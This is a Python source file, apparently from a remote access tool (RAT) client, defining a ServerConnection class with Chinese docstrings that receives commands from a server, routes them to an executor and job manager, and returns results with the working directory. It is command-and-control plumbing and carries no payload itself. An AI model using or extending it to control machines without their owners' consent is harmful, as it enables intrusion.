import os
import queue

from client.commands.executor import CommandExecutor
from client.connection.message_dispatcher import ClientInboundMessageDispatcher
from client.connection.message_router import ClientInboundMessageRouter
from client.jobs.core.manager import JobManager
from core.protocol.ratsocket import RATSocket
from core.utils.logger import logger


class ServerConnection(RATSocket):
    """
    客户端与服务端的连接类。

    当前承载：
    - 普通消息收发
    - 命令执行结果回传
    - 后台任务运行态管理
    - 入站消息分发与路由
    """

    def __init__(self):
        super().__init__()
        self.client_id = None

        self.command_executor = CommandExecutor(self)
        self.pending_message_queue = queue.Queue()

        self.job_manager = JobManager(self)
        self.is_connected = False

        self.message_router = ClientInboundMessageRouter(self)
        self.message_dispatcher = ClientInboundMessageDispatcher(self)

    def mark_connected(self):
        self.is_connected = True

    def mark_disconnected(self):
        self.is_connected = False

    def reset_runtime_state(self):
        try:
            while True:
                self.pending_message_queue.get_nowait()
        except queue.Empty:
            pass
        except Exception:
            pass

    def send_result(self, id: int, status: int, result: str, eof: int = 1):
        data = {
            'type': 'result',
            'id': id,
            'status': status,
            'text': result,
            'cwd': os.getcwd(),
            'eof': eof,
        }
        logger.debug(data)
        self.send(data)

    def enqueue_pending_message(self, data: dict):
        self.pending_message_queue.put(data)

    def handle_received_message(self, data: dict):
        logger.debug(data)
        return self.message_dispatcher.dispatch(data)

    def recv_message(self):
        data = self.recv()
        result = self.handle_received_message(data)
        if result:
            self.send_result(*result)

    def recv_command(self, timeout: float | None = None):
        data = self.pending_message_queue.get(timeout=timeout)

        try:
            return self.message_router.dispatch(data)
        except Exception as e:
            logger.error(e, exc_info=True)
            return data.get('id'), 0, f'{e}\n'









